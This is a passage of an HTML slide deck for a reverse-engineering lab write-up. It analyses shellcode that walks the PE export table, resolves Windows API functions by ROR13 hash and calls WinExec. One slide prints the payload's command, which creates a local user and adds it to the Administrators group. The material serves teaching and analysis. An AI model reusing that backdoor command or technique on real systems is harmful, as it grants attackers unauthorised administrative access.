+            <header><h1>Presenter Notes</h1></header>
+            <section>
+            
+            </section>
+          </div>
+          <footer>
+            
+            <aside class="source">
+              Source: <a href="lab3Writeup.md">lab3Writeup.md</a>
+            </aside>
+            
+            <aside class="page_number">
+              15/32
+            </aside>
+          </footer>
+        </div>
+      </div>
+      
+      <!-- slide source: lab3Writeup.md -->
+      <div class="slide-wrapper">
+        <div class="slide has_code slide-16">
+          <div class="inner">
+            
+            <header><h1>Continuing</h1></header>
+            
+            
+            <section><div class="highlight"><pre>seg<span class="m">000</span><span class="nl">:000000B0</span>                 mov     eax<span class="p">,</span> [ebp+<span class="m">3</span>Ch]
+seg<span class="m">000</span><span class="nl">:000000B3</span>                 mov     edx<span class="p">,</span> [ebp+eax+<span class="m">78</span>h]
+</pre></div>
+
+<p>DllBase = start of PE header = _IMAGE_DOS_HEADER</p>
+<div class="highlight"><pre><span class="o">&gt;&gt;&gt;</span> <span class="n">dt</span><span class="p">(</span><span class="s">&quot;_IMAGE_DOS_HEADER&quot;</span><span class="p">)</span>
+ <span class="s">&#39;_IMAGE_DOS_HEADER&#39;</span> <span class="p">(</span><span class="mi">64</span> <span class="nb">bytes</span><span class="p">)</span>
+<span class="mh">0x0</span>   <span class="p">:</span> <span class="n">e_magic</span>                        <span class="p">[</span><span class="s">&#39;unsigned short&#39;</span><span class="p">]</span>
+<span class="mh">0x2</span>   <span class="p">:</span> <span class="n">e_cblp</span>                         <span class="p">[</span><span class="s">&#39;unsigned short&#39;</span><span class="p">]</span>
+<span class="mh">0x4</span>   <span class="p">:</span> <span class="n">e_cp</span>                           <span class="p">[</span><span class="s">&#39;unsigned short&#39;</span><span class="p">]</span>
+<span class="mh">0x6</span>   <span class="p">:</span> <span class="n">e_crlc</span>                         <span class="p">[</span><span class="s">&#39;unsigned short&#39;</span><span class="p">]</span>
+<span class="mh">0x8</span>   <span class="p">:</span> <span class="n">e_cparhdr</span>                      <span class="p">[</span><span class="s">&#39;unsigned short&#39;</span><span class="p">]</span>
+<span class="mh">0xa</span>   <span class="p">:</span> <span class="n">e_minalloc</span>                     <span class="p">[</span><span class="s">&#39;unsigned short&#39;</span><span class="p">]</span>
+<span class="mh">0xc</span>   <span class="p">:</span> <span class="n">e_maxalloc</span>                     <span class="p">[</span><span class="s">&#39;unsigned short&#39;</span><span class="p">]</span>
+<span class="mh">0xe</span>   <span class="p">:</span> <span class="n">e_ss</span>                           <span class="p">[</span><span class="s">&#39;unsigned short&#39;</span><span class="p">]</span>
+<span class="mh">0x10</span>  <span class="p">:</span> <span class="n">e_sp</span>                           <span class="p">[</span><span class="s">&#39;unsigned short&#39;</span><span class="p">]</span>
+<span class="mh">0x12</span>  <span class="p">:</span> <span class="n">e_csum</span>                         <span class="p">[</span><span class="s">&#39;unsigned short&#39;</span><span class="p">]</span>
+<span class="mh">0x14</span>  <span class="p">:</span> <span class="n">e_ip</span>                           <span class="p">[</span><span class="s">&#39;unsigned short&#39;</span><span class="p">]</span>
+<span class="mh">0x16</span>  <span class="p">:</span> <span class="n">e_cs</span>                           <span class="p">[</span><span class="s">&#39;unsigned short&#39;</span><span class="p">]</span>
+<span class="mh">0x18</span>  <span class="p">:</span> <span class="n">e_lfarlc</span>                       <span class="p">[</span><span class="s">&#39;unsigned short&#39;</span><span class="p">]</span>
+<span class="mh">0x1a</span>  <span class="p">:</span> <span class="n">e_ovno</span>                         <span class="p">[</span><span class="s">&#39;unsigned short&#39;</span><span class="p">]</span>
+<span class="mh">0x1c</span>  <span class="p">:</span> <span class="n">e_res</span>                          <span class="p">[</span><span class="s">&#39;array&#39;</span><span class="p">,</span> <span class="mi">4</span><span class="p">,</span> <span class="p">[</span><span class="s">&#39;unsigned short&#39;</span><span class="p">]]</span>
+<span class="mh">0x24</span>  <span class="p">:</span> <span class="n">e_oemid</span>                        <span class="p">[</span><span class="s">&#39;unsigned short&#39;</span><span class="p">]</span>
+<span class="mh">0x26</span>  <span class="p">:</span> <span class="n">e_oeminfo</span>                      <span class="p">[</span><span class="s">&#39;unsigned short&#39;</span><span class="p">]</span>
+<span class="mh">0x28</span>  <span class="p">:</span> <span class="n">e_res2</span>                         <span class="p">[</span><span class="s">&#39;array&#39;</span><span class="p">,</span> <span class="mi">10</span><span class="p">,</span> <span class="p">[</span><span class="s">&#39;unsigned short&#39;</span><span class="p">]]</span>
+<span class="mh">0x3c</span>  <span class="p">:</span> <span class="n">e_lfanew</span>                       <span class="p">[</span><span class="s">&#39;long&#39;</span><span class="p">]</span>
+</pre></div>
+</section>
+            
+          </div>
+          <div class="presenter_notes">
+            <header><h1>Presenter Notes</h1></header>
+            <section>
+            
+            </section>
+          </div>
+          <footer>
+            
+            <aside class="source">
+              Source: <a href="lab3Writeup.md">lab3Writeup.md</a>
+            </aside>
+            
+            <aside class="page_number">
+              16/32
+            </aside>
+          </footer>
+        </div>
+      </div>
+      
+      <!-- slide source: lab3Writeup.md -->
+      <div class="slide-wrapper">
+        <div class="slide has_code slide-17">
+          <div class="inner">
+            
+            <header><h1>mov     eax, [ebp+3Ch]</h1></header>
+            
+            
+            <section><p>ebp is _IMAGE_DOS_HEADER</p>
+<p>0x3c into header is e_lfanew</p>
+<p>e_lfanew -&gt; Poiner to _IMAGE_NT_HEADER</p>
+<p>eax is now _IMAGE_NT_HEADER</p>
+<div class="highlight"><pre><span class="o">&gt;&gt;&gt;</span> <span class="n">dt</span><span class="p">(</span><span class="s">&quot;_IMAGE_NT_HEADERS&quot;</span><span class="p">)</span>
+ <span class="s">&#39;_IMAGE_NT_HEADERS&#39;</span> <span class="p">(</span><span class="mi">248</span> <span class="nb">bytes</span><span class="p">)</span>
+<span class="mh">0x0</span>   <span class="p">:</span> <span class="n">Signature</span>                      <span class="p">[</span><span class="s">&#39;unsigned long&#39;</span><span class="p">]</span>
+<span class="mh">0x4</span>   <span class="p">:</span> <span class="n">FileHeader</span>                     <span class="p">[</span><span class="s">&#39;_IMAGE_FILE_HEADER&#39;</span><span class="p">]</span>
+<span class="mh">0x18</span>  <span class="p">:</span> <span class="n">OptionalHeader</span>                 <span class="p">[</span><span class="s">&#39;_IMAGE_OPTIONAL_HEADER&#39;</span><span class="p">]</span>
+</pre></div>
+</section>
+            
+          </div>
+          <div class="presenter_notes">
+            <header><h1>Presenter Notes</h1></header>
+            <section>
+            
+            </section>
+          </div>
+          <footer>
+            
+            <aside class="source">
+              Source: <a href="lab3Writeup.md">lab3Writeup.md</a>
+            </aside>
+            
+            <aside class="page_number">
+              17/32
+            </aside>
+          </footer>
+        </div>
+      </div>
+      
+      <!-- slide source: lab3Writeup.md -->
+      <div class="slide-wrapper">
+        <div class="slide has_code slide-18">
+          <div class="inner">
+            
+            <header><h1>mov     edx, [ebp+eax+78h]</h1></header>
+            
+            
+            <section><p>eax is _IMAGE_NT_HEADER and ebp is _IMAGE_NT_HEADER</p>
+<p>78 bytes into the _IMAGE_NT_HEADER is an offset in _IMAGE_OPTIONAL_HEADER</p>
+<p>0x78 - 0x18 = 0x60</p>
+<div class="highlight"><pre><span class="o">&gt;&gt;&gt;</span> <span class="n">dt</span><span class="p">(</span><span class="s">&quot;_IMAGE_OPTIONAL_HEADER&quot;</span><span class="p">)</span>
+ <span class="s">&#39;_IMAGE_OPTIONAL_HEADER&#39;</span> <span class="p">(</span><span class="mi">224</span> <span class="nb">bytes</span><span class="p">)</span>
+<span class="mh">0x0</span>   <span class="p">:</span> <span class="n">Magic</span>                          <span class="p">[</span><span class="s">&#39;unsigned short&#39;</span><span class="p">]</span>
+<span class="p">[</span><span class="n">snip</span><span class="p">]</span>
+<span class="mh">0x58</span>  <span class="p">:</span> <span class="n">LoaderFlags</span>                    <span class="p">[</span><span class="s">&#39;unsigned long&#39;</span><span class="p">]</span>
+<span class="mh">0x5c</span>  <span class="p">:</span> <span class="n">NumberOfRvaAndSizes</span>            <span class="p">[</span><span class="s">&#39;unsigned long&#39;</span><span class="p">]</span>
+<span class="mh">0x60</span>  <span class="p">:</span> <span class="n">DataDirectory</span>                  <span class="p">[</span><span class="s">&#39;array&#39;</span><span class="p">,</span> <span class="mi">16</span><span class="p">,</span> <span class="p">[</span><span class="s">&#39;_IMAGE_DATA_DIRECTORY&#39;</span><span class="p">]]</span>
+
+<span class="o">&gt;&gt;&gt;</span> <span class="n">dt</span><span class="p">(</span><span class="s">&quot;_IMAGE_DATA_DIRECTORY&quot;</span><span class="p">)</span>
+ <span class="s">&#39;_IMAGE_DATA_DIRECTORY&#39;</span> <span class="p">(</span><span class="mi">8</span> <span class="nb">bytes</span><span class="p">)</span>
+<span class="mh">0x0</span>   <span class="p">:</span> <span class="n">VirtualAddress</span>                 <span class="p">[</span><span class="s">&#39;unsigned long&#39;</span><span class="p">]</span>
+<span class="mh">0x4</span>   <span class="p">:</span> <span class="n">Size</span>                           <span class="p">[</span><span class="s">&#39;unsigned long&#39;</span><span class="p">]</span>
+</pre></div>
+</section>
+            
+          </div>
+          <div class="presenter_notes">
+            <header><h1>Presenter Notes</h1></header>
+            <section>
+            
+            </section>
+          </div>
+          <footer>
+            
+            <aside class="source">
+              Source: <a href="lab3Writeup.md">lab3Writeup.md</a>
+            </aside>
+            
+            <aside class="page_number">
+              18/32
+            </aside>
+          </footer>
+        </div>
+      </div>
+      
+      <!-- slide source: lab3Writeup.md -->
+      <div class="slide-wrapper">
+        <div class="slide slide-19">
+          <div class="inner">
+            
+            <header><h1>Which data directory appears first?</h1></header>
+            
+            
+            <section><p>PEView is useful here... parse anything on disk!</p>
+<p><img alt="" src="..\slideResources\labs\dataDirs.png" /></p></section>
+            
+          </div>
+          <div class="presenter_notes">
+            <header><h1>Presenter Notes</h1></header>
+            <section>
+            
+            </section>
+          </div>
+          <footer>
+            
+            <aside class="source">
+              Source: <a href="lab3Writeup.md">lab3Writeup.md</a>
+            </aside>
+            
+            <aside class="page_number">
+              19/32
+            </aside>
+          </footer>
+        </div>
+      </div>
+      
+      <!-- slide source: lab3Writeup.md -->
+      <div class="slide-wrapper">
+        <div class="slide has_code slide-20">
+          <div class="inner">
+            
+            <header><h1>We now have Export Address Table</h1></header>
+            
+            
+            <section><div class="highlight"><pre><span class="o">&gt;&gt;&gt;</span> <span class="n">dt</span><span class="p">(</span><span class="s">&quot;_IMAGE_EXPORT_DIRECTORY&quot;</span><span class="p">)</span>
+ <span class="s">&#39;_IMAGE_EXPORT_DIRECTORY&#39;</span> <span class="p">(</span><span class="mi">40</span> <span class="nb">bytes</span><span class="p">)</span>
+<span class="mh">0x10</span>  <span class="p">:</span> <span class="n">Base</span>                           <span class="p">[</span><span class="s">&#39;unsigned int&#39;</span><span class="p">]</span>
+<span class="mh">0x14</span>  <span class="p">:</span> <span class="n">NumberOfFunctions</span>              <span class="p">[</span><span class="s">&#39;unsigned int&#39;</span><span class="p">]</span>
+<span class="mh">0x18</span>  <span class="p">:</span> <span class="n">NumberOfNames</span>                  <span class="p">[</span><span class="s">&#39;unsigned int&#39;</span><span class="p">]</span>
+<span class="mh">0x1c</span>  <span class="p">:</span> <span class="n">AddressOfFunctions</span>             <span class="p">[</span><span class="s">&#39;unsigned int&#39;</span><span class="p">]</span>
+<span class="mh">0x20</span>  <span class="p">:</span> <span class="n">AddressOfNames</span>                 <span class="p">[</span><span class="s">&#39;unsigned int&#39;</span><span class="p">]</span>
+<span class="mh">0x24</span>  <span class="p">:</span> <span class="n">AddressOfNameOrdinals</span>          <span class="p">[</span><span class="s">&#39;unsigned int&#39;</span><span class="p">]</span>
+</pre></div>
+
+<p><br></p>
+<div class="highlight"><pre>seg<span class="m">000</span><span class="nl">:000000B9</span>                 mov     ecx<span class="p">,</span> [edx+<span class="m">18</span>h]
+seg<span class="m">000</span><span class="nl">:000000BC</span>                 mov     ebx<span class="p">,</span> [edx+<span class="m">20</span>h]
+</pre></div>
+
+<p>ecx is NumberOfNames</p>
+<p>ebx is AddressOfNames</p></section>
+            
+          </div>
+          <div class="presenter_notes">
+            <header><h1>Presenter Notes</h1></header>
+            <section>
+            
+            </section>
+          </div>
+          <footer>
+            
+            <aside class="source">
+              Source: <a href="lab3Writeup.md">lab3Writeup.md</a>
+            </aside>
+            
+            <aside class="page_number">
+              20/32
+            </aside>
+          </footer>
+        </div>
+      </div>
+      
+      <!-- slide source: lab3Writeup.md -->
+      <div class="slide-wrapper">
+        <div class="slide slide-21">
+          <div class="inner">
+            
+            <header><h1>ROR</h1></header>
+            
+            
+            <section><p><img alt="" src="..\slideResources\labs\ror13.png" /></p></section>
+            
+          </div>
+          <div class="presenter_notes">
+            <header><h1>Presenter Notes</h1></header>
+            <section>
+            
+            </section>
+          </div>
+          <footer>
+            
+            <aside class="source">
+              Source: <a href="lab3Writeup.md">lab3Writeup.md</a>
+            </aside>
+            
+            <aside class="page_number">
+              21/32
+            </aside>
+          </footer>
+        </div>
+      </div>
+      
+      <!-- slide source: lab3Writeup.md -->
+      <div class="slide-wrapper">
+        <div class="slide slide-22">
+          <div class="inner">
+            
+            <header><h1>How?</h1></header>
+            
+            
+            <section><p>ecx is counter / number of exports</p>
+<p>ebx is array of export names</p>
+<p>32 bit pointers are 4 bytes...</p>
+<p>mov     esi, [ebx+ecx*4] = Traverse array of names and grab one!</p></section>
+            
+          </div>
+          <div class="presenter_notes">
+            <header><h1>Presenter Notes</h1></header>
+            <section>
+            
+            </section>
+          </div>
+          <footer>
+            
+            <aside class="source">
+              Source: <a href="lab3Writeup.md">lab3Writeup.md</a>
+            </aside>
+            
+            <aside class="page_number">
+              22/32
+            </aside>
+          </footer>
+        </div>
+      </div>
+      
+      <!-- slide source: lab3Writeup.md -->
+      <div class="slide-wrapper">
+        <div class="slide slide-23">
+          <div class="inner">
+            
+            <header><h1>Perform ROR13 hash</h1></header>
+            
+            
+            <section><p>Hash each function name from address of names until one matches the value we pushed (location esp+20h+arg_4) </p>
+<p>With a match, go to loc_DA</p></section>
+            
+          </div>
+          <div class="presenter_notes">
+            <header><h1>Presenter Notes</h1></header>
+            <section>
+            
+            </section>
+          </div>
+          <footer>
+            
+            <aside class="source">
+              Source: <a href="lab3Writeup.md">lab3Writeup.md</a>
+            </aside>
+            
+            <aside class="page_number">
+              23/32
+            </aside>
+          </footer>
+        </div>
+      </div>
+      
+      <!-- slide source: lab3Writeup.md -->
+      <div class="slide-wrapper">
+        <div class="slide has_code slide-24">
+          <div class="inner">
+            
+            <header><h1>loc_DA</h1></header>
+            
+            
+            <section><div class="highlight"><pre>seg<span class="m">000</span><span class="nl">:000000DA</span> loc_DA:                                 ; CODE XREF: sub_AB+<span class="m">26</span>j
+seg<span class="m">000</span><span class="nl">:000000DA</span>                 cmp     edi<span class="p">,</span> [esp+<span class="m">20</span>h+arg_<span class="m">4</span>]
+seg<span class="m">000</span><span class="nl">:000000DE</span>                 jnz     short loc_C<span class="m">1</span>
+seg<span class="m">000</span><span class="nl">:000000E0</span>                 mov     ebx<span class="p">,</span> [edx+<span class="m">24</span>h]
+seg<span class="m">000</span><span class="nl">:000000E3</span>                 add     ebx<span class="p">,</span> ebp
+seg<span class="m">000</span><span class="nl">:000000E5</span>                 mov     cx<span class="p">,</span> [ebx+ecx*<span class="m">2</span>]
+seg<span class="m">000</span><span class="nl">:000000E9</span>                 mov     ebx<span class="p">,</span> [edx+<span class="m">1</span>Ch]
+seg<span class="m">000</span><span class="nl">:000000EC</span>                 add     ebx<span class="p">,</span> ebp
+seg<span class="m">000</span><span class="nl">:000000EE</span>                 mov     eax<span class="p">,</span> [ebx+ecx*<span class="m">4</span>]
+seg<span class="m">000</span><span class="nl">:000000F1</span>                 add     eax<span class="p">,</span> ebp
+seg<span class="m">000</span><span class="nl">:000000F3</span>                 mov     [esp+<span class="m">20</span>h+var_<span class="m">4</span>]<span class="p">,</span> eax
+seg<span class="m">000</span><span class="nl">:000000F7</span>
+seg<span class="m">000</span><span class="nl">:000000F7</span> loc_F<span class="m">7</span>:                                 ; CODE XREF: sub_AB:loc_C1j
+seg<span class="m">000</span><span class="nl">:000000F7</span>                 popa
+seg<span class="m">000</span><span class="nl">:000000F8</span>                 retn
+</pre></div>
+</section>
+            
+          </div>
+          <div class="presenter_notes">
+            <header><h1>Presenter Notes</h1></header>
+            <section>
+            
+            </section>
+          </div>
+          <footer>
+            
+            <aside class="source">
+              Source: <a href="lab3Writeup.md">lab3Writeup.md</a>
+            </aside>
+            
+            <aside class="page_number">
+              24/32
+            </aside>
+          </footer>
+        </div>
+      </div>
+      
+      <!-- slide source: lab3Writeup.md -->
+      <div class="slide-wrapper">
+        <div class="slide has_code slide-25">
+          <div class="inner">
+            
+            <header><h1>Now what?</h1></header>
+            
+            
+            <section><p>We have a matched hash</p>
+<p>Take address of export table and go into it 0x24 bytes </p>
+<div class="highlight"><pre>mov     ebx<span class="p">,</span> [edx+<span class="m">24</span>h]
+</pre></div>
+
+<p><br></p>
+<div class="highlight"><pre><span class="o">&gt;&gt;&gt;</span> <span class="n">dt</span><span class="p">(</span><span class="s">&quot;_IMAGE_EXPORT_DIRECTORY&quot;</span><span class="p">)</span>
+ <span class="s">&#39;_IMAGE_EXPORT_DIRECTORY&#39;</span> <span class="p">(</span><span class="mi">40</span> <span class="nb">bytes</span><span class="p">)</span>
+<span class="mh">0x10</span>  <span class="p">:</span> <span class="n">Base</span>                           <span class="p">[</span><span class="s">&#39;unsigned int&#39;</span><span class="p">]</span>
+<span class="mh">0x14</span>  <span class="p">:</span> <span class="n">NumberOfFunctions</span>              <span class="p">[</span><span class="s">&#39;unsigned int&#39;</span><span class="p">]</span>
+<span class="mh">0x18</span>  <span class="p">:</span> <span class="n">NumberOfNames</span>                  <span class="p">[</span><span class="s">&#39;unsigned int&#39;</span><span class="p">]</span>
+<span class="mh">0x1c</span>  <span class="p">:</span> <span class="n">AddressOfFunctions</span>             <span class="p">[</span><span class="s">&#39;unsigned int&#39;</span><span class="p">]</span>
+<span class="mh">0x20</span>  <span class="p">:</span> <span class="n">AddressOfNames</span>                 <span class="p">[</span><span class="s">&#39;unsigned int&#39;</span><span class="p">]</span>
+<span class="mh">0x24</span>  <span class="p">:</span> <span class="n">AddressOfNameOrdinals</span>          <span class="p">[</span><span class="s">&#39;unsigned int&#39;</span><span class="p">]</span>
+</pre></div>
+
+<p>0x24 = AddressOfNameOrdinals</p>
+<p>Ordinal = value associated with each export... another way to find them. </p></section>
+            
+          </div>
+          <div class="presenter_notes">
+            <header><h1>Presenter Notes</h1></header>
+            <section>
+            
+            </section>
+          </div>
+          <footer>
+            
+            <aside class="source">
+              Source: <a href="lab3Writeup.md">lab3Writeup.md</a>
+            </aside>
+            
+            <aside class="page_number">
+              25/32
+            </aside>
+          </footer>
+        </div>
+      </div>
+      
+      <!-- slide source: lab3Writeup.md -->
+      <div class="slide-wrapper">
+        <div class="slide slide-26">
+          <div class="inner">
+            
+            <header><h1>mov     cx, [ebx+ecx*2]</h1></header>
+            
+            
+            <section><p>We know how many entries into the _IMAGE_EXPORT_DIRECTORY we are as we kept track</p>
+<p>mov ordinal value into cx </p></section>
+            
+          </div>
+          <div class="presenter_notes">
+            <header><h1>Presenter Notes</h1></header>
+            <section>
+            
+            </section>
+          </div>
+          <footer>
+            
+            <aside class="source">
+              Source: <a href="lab3Writeup.md">lab3Writeup.md</a>
+            </aside>
+            
+            <aside class="page_number">
+              26/32
+            </aside>
+          </footer>
+        </div>
+      </div>
+      
+      <!-- slide source: lab3Writeup.md -->
+      <div class="slide-wrapper">
+        <div class="slide has_code slide-27">
+          <div class="inner">
+            
+            <header><h1>mov     ebx, [edx+1Ch]</h1></header>
+            
+            
+            <section><div class="highlight"><pre><span class="mh">0x1c</span>  <span class="p">:</span> <span class="n">AddressOfFunctions</span>             <span class="p">[</span><span class="s">&#39;unsigned int&#39;</span><span class="p">]</span>
+</pre></div>
+
+<p><br></p>
+<div class="highlight"><pre>mov     eax<span class="p">,</span> [ebx+ecx*<span class="m">4</span>]
+</pre></div>
+
+<p>Same as before.. now get the address of that function we hashed! </p></section>
+            
+          </div>
+          <div class="presenter_notes">
+            <header><h1>Presenter Notes</h1></header>
+            <section>
+            
+            </section>
+          </div>
+          <footer>
+            
+            <aside class="source">
+              Source: <a href="lab3Writeup.md">lab3Writeup.md</a>
+            </aside>
+            
+            <aside class="page_number">
+              27/32
+            </aside>
+          </footer>
+        </div>
+      </div>
+      
+      <!-- slide source: lab3Writeup.md -->
+      <div class="slide-wrapper">
+        <div class="slide slide-28">
+          <div class="inner">
+            
+            <header><h1>Hash now resolved!</h1></header>
+            
+            
+            <section><p>We now have the location of the function we want to execute in a register (eax) after sub_AB</p>
+<p>Using that value, we can setup our stack frames however we want (to that API function) and call it</p></section>
+            
+          </div>
+          <div class="presenter_notes">
+            <header><h1>Presenter Notes</h1></header>
+            <section>
+            
+            </section>
+          </div>
+          <footer>
+            
+            <aside class="source">
+              Source: <a href="lab3Writeup.md">lab3Writeup.md</a>
+            </aside>
+            
+            <aside class="page_number">
+              28/32
+            </aside>
+          </footer>
+        </div>
+      </div>
+      
+      <!-- slide source: lab3Writeup.md -->
+      <div class="slide-wrapper">
+        <div class="slide has_code slide-29">
+          <div class="inner">
+            
+            <header><h1>Winexec</h1></header>
+            
+            
+            <section><div class="highlight"><pre>seg<span class="m">000</span><span class="nl">:00000032</span>                 jmp     short $+<span class="m">2</span>
+seg<span class="m">000</span><span class="nl">:00000034</span>                 jmp     short loc_<span class="m">54</span>
+seg<span class="m">000</span><span class="nl">:00000036</span> ; ---------------------------------------------------------------------------
+seg<span class="m">000</span><span class="nl">:00000036</span>
+seg<span class="m">000</span><span class="nl">:00000036</span> loc_<span class="m">36</span>:                                 ; CODE XREF: seg<span class="m">000</span><span class="nl">:loc_54</span>p
+seg<span class="m">000</span><span class="nl">:00000036</span>                 pop     ecx ;string
+seg<span class="m">000</span><span class="nl">:00000037</span>                 xor     edx<span class="p">,</span> edx
+seg<span class="m">000</span><span class="nl">:00000039</span>                 push    edx
+seg<span class="m">000</span><span class="nl">:0000003A</span>                 push    ecx
+seg<span class="m">000</span><span class="nl">:0000003B</span>                 <span class="k">call</span>    eax ;WinExec
+
+seg<span class="m">000</span><span class="nl">:00000054</span> loc_<span class="m">54</span>:                                 ; CODE XREF: seg<span class="m">000</span><span class="nl">:00000034</span>j
+seg<span class="m">000</span><span class="nl">:00000054</span>                 <span class="k">call</span>    loc_<span class="m">36</span>
+seg<span class="m">000</span><span class="nl">:00000054</span> ; ---------------------------------------------------------------------------
+seg<span class="m">000</span><span class="nl">:00000059</span> aCmd_exeCNetUse db <span class="s1">&#39;cmd.exe /c net user 0xC0ff33 c0ff33 /ADD &amp;&amp; net localgroup Admini&#39;</span>
+seg<span class="m">000</span><span class="nl">:00000059</span>                 db <span class="s1">&#39;strators /ADD 0x&#39;</span><span class="p">,</span><span class="m">0</span>
+</pre></div>
+</section>
+            
+          </div>
+          <div class="presenter_notes">
+            <header><h1>Presenter Notes</h1></header>
+            <section>
+            
+            </section>
+          </div>
+          <footer>
+            
+            <aside class="source">
+              Source: <a href="lab3Writeup.md">lab3Writeup.md</a>
+            </aside>
+            
+            <aside class="page_number">
+              29/32
+            </aside>
+          </footer>
+        </div>
+      </div>
+      
+      <!-- slide source: lab3Writeup.md -->
+      <div class="slide-wrapper">
+        <div class="slide has_code slide-30">
+          <div class="inner">
+            
+            <header><h1>73E2D87Eh Hash</h1></header>
+            
+            
+            <section><div class="highlight"><pre>C:\Users\Topher<span class="p">&gt;</span><span class="n">hashing</span>.py <span class="n">/mod</span> c:\windows\system<span class="m">32</span> kernel<span class="m">32</span>
+.dll <span class="p">|</span> <span class="n">grep</span>  <span class="m">73</span>E<span class="m">2</span>D<span class="m">87</span>E
+[+] <span class="m">0</span>x<span class="m">73</span>E<span class="m">2</span>D<span class="m">87</span>E <span class="o">=</span> kernel<span class="m">32</span>.dll!ExitProcess
+</pre></div>
+</section>
+            
+          </div>
+          <div class="presenter_notes">
+            <header><h1>Presenter Notes</h1></header>
+            <section>
+            
+            </section>
+          </div>
+          <footer>
+            
+            <aside class="source">
+              Source: <a href="lab3Writeup.md">lab3Writeup.md</a>
+            </aside>
+            
+            <aside class="page_number">
+              30/32
+            </aside>
+          </footer>
+        </div>
+      </div>
+      
+      <!-- slide source: lab3Writeup.md -->
+      <div class="slide-wrapper">
+        <div class="slide has_code slide-31">
+          <div class="inner">
+            
+            <header><h1>Lastly</h1></header>
+            
+            
+            <section><div class="highlight"><pre>push    <span class="m">73</span>E<span class="m">2</span>D<span class="m">87</span>Eh
+seg<span class="m">000</span><span class="nl">:00000047</span>                 push    dword ptr [ebp<span class="m">-4</span>]
+seg<span class="m">000</span><span class="nl">:0000004A</span>                 <span class="k">call</span>    sub_AB
+seg<span class="m">000</span><span class="nl">:0000004F</span>                 xor     esi<span class="p">,</span> esi
+seg<span class="m">000</span><span class="nl">:00000051</span>                 push    esi
+seg<span class="m">000</span><span class="nl">:00000052</span>                 <span class="k">call</span>    eax
+</pre></div>
+
+<p>Exit Process with no exit code...</p></section>
+            
+          </div>
+          <div class="presenter_notes">
+            <header><h1>Presenter Notes</h1></header>
+            <section>
+            
+            </section>
+          </div>
+          <footer>
+            
+            <aside class="source">
+              Source: <a href="lab3Writeup.md">lab3Writeup.md</a>
+            </aside>
+            
+            <aside class="page_number">
+              31/32
+            </aside>
+          </footer>
+        </div>
+      </div>
+      
+      <!-- slide source: lab3Writeup.md -->
+      <div class="slide-wrapper">
+        <div class="slide slide-32">
+          <div class="inner">
+            
+            <header><h1>EOF</h1></header>
+            
+            
+          </div>
+          <div class="presenter_notes">
+            <header><h1>Presenter Notes</h1></header>
+            <section>
+            
+            </section>
+          </div>
+          <footer>
+            
+            <aside class="source">
+              Source: <a href="lab3Writeup.md">lab3Writeup.md</a>
+            </aside>
+            
+            <aside class="page_number">
+              32/32
+            </aside>
+          </footer>
+        </div>
+      </div>
+      
+    </div>
+  </div>
+  
+  <div id="toc" class="sidebar hidden">
+    <h2>Table of Contents</h2>
+    <table>
+      <caption>Table of Contents</caption>
+      
+      <tr id="toc-row-1">
+        <th><a href="#slide1">Lab 3 Writeup</a></th>
+        <td><a href="#slide1">1</a></td>
+      </tr>
+      
+      
+      <tr id="toc-row-2">
+        <th><a href="#slide2">Criteria</a></th>
+        <td><a href="#slide2">2</a></td>
+      </tr>
+      
+      
+      <tr id="toc-row-3">
+        <th><a href="#slide3">Seg000</a></th>
+        <td><a href="#slide3">3</a></td>
+      </tr>
+      
+      
+      <tr id="toc-row-4">
+        <th><a href="#slide4">loc_c</a></th>
+        <td><a href="#slide4">4</a></td>
+      </tr>
+      
+      
+      <tr id="toc-row-5">
+        <th><a href="#slide5">PEB</a></th>
+        <td><a href="#slide5">5</a></td>
+      </tr>
+      
+      
+      <tr id="toc-row-6">
+        <th><a href="#slide6">mov     eax, [eax+0Ch]</a></th>
+        <td><a href="#slide6">6</a></td>
+      </tr>
+      
+      
+      <tr id="toc-row-7">
+        <th><a href="#slide7">mov     esi, [eax+14h]</a></th>
+        <td><a href="#slide7">7</a></td>
+      </tr>
+      
+      
+      <tr id="toc-row-8">
+        <th><a href="#slide8">mov     edx, [esi] <br>mov     edx, [edx]<br>mov     edx, [edx+10h]</a></th>
+        <td><a href="#slide8">8</a></td>
+      </tr>
+      
+      
+      <tr id="toc-row-9">
+        <th><a href="#slide9">mov     edx, [edx+10h]</a></th>
+        <td><a href="#slide9">9</a></td>
+      </tr>
+      
+      
+      <tr id="toc-row-10">
+        <th><a href="#slide10">How?</a></th>
+        <td><a href="#slide10">10</a></td>
+      </tr>
+      
+      
+      <tr id="toc-row-11">
+        <th><a href="#slide11">Continuing</a></th>
+        <td><a href="#slide11">11</a></td>
+      </tr>
+      
+      
+      <tr id="toc-row-12">
+        <th><a href="#slide12">0E8AFE98h Hash</a></th>
+        <td><a href="#slide12">12</a></td>
+      </tr>
+      
+      
+      <tr id="toc-row-13">
+        <th><a href="#slide13">sub_AB</a></th>
+        <td><a href="#slide13">13</a></td>
+      </tr>
+      
+      
+      <tr id="toc-row-14">
+        <th><a href="#slide14">sub_AB</a></th>
+        <td><a href="#slide14">14</a></td>
+      </tr>
+      
+      
+      <tr id="toc-row-15">
+        <th><a href="#slide15">Stack</a></th>
+        <td><a href="#slide15">15</a></td>
+      </tr>
+      
+      
+      <tr id="toc-row-16">
+        <th><a href="#slide16">Continuing</a></th>
+        <td><a href="#slide16">16</a></td>
+      </tr>
+      
+      
+      <tr id="toc-row-17">
+        <th><a href="#slide17">mov     eax, [ebp+3Ch]</a></th>
+        <td><a href="#slide17">17</a></td>
+      </tr>
+      
+      
+      <tr id="toc-row-18">
+        <th><a href="#slide18">mov     edx, [ebp+eax+78h]</a></th>
+        <td><a href="#slide18">18</a></td>
+      </tr>
+      
+      
+      <tr id="toc-row-19">
+        <th><a href="#slide19">Which data directory appears first?</a></th>
+        <td><a href="#slide19">19</a></td>
+      </tr>
+      
+      
+      <tr id="toc-row-20">
+        <th><a href="#slide20">We now have Export Address Table</a></th>
+        <td><a href="#slide20">20</a></td>
+      </tr>
+      
+      
+      <tr id="toc-row-21">
+        <th><a href="#slide21">ROR</a></th>
+        <td><a href="#slide21">21</a></td>
+      </tr>
+      
+      
+      <tr id="toc-row-22">
+        <th><a href="#slide22">How?</a></th>
+        <td><a href="#slide22">22</a></td>
+      </tr>
+      
+      
+      <tr id="toc-row-23">
+        <th><a href="#slide23">Perform ROR13 hash</a></th>
+        <td><a href="#slide23">23</a></td>
+      </tr>
+      
+      
+      <tr id="toc-row-24">
+        <th><a href="#slide24">loc_DA</a></th>
+        <td><a href="#slide24">24</a></td>
+      </tr>
+      
+      
+      <tr id="toc-row-25">
+        <th><a href="#slide25">Now what?</a></th>
+        <td><a href="#slide25">25</a></td>
+      </tr>
+      
+      
